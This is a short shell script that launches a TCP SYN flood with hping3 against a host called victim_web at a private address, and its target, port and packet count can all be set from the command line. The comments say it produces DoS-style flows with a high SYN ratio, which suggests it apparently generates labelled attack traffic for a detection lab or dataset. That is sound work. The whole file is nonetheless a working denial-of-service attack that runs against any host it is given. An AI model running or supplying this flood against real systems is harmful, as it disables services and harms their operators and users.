#!/bin/sh
# syn_flood.sh — TCP SYN flood against victim_web (172.20.0.10:80)
# Generates DoS-GoldenEye-style flows: high syn_flag_ratio, short duration.
# -k keeps the same source port so all packets belong to one flow.
TARGET=${1:-172.20.0.10}
PORT=${2:-80}
COUNT=${3:-10000}
echo "[attack] SYN flood → $TARGET:$PORT  ($COUNT packets)"
hping3 --syn -k -p "$PORT" -c "$COUNT" --faster "$TARGET"
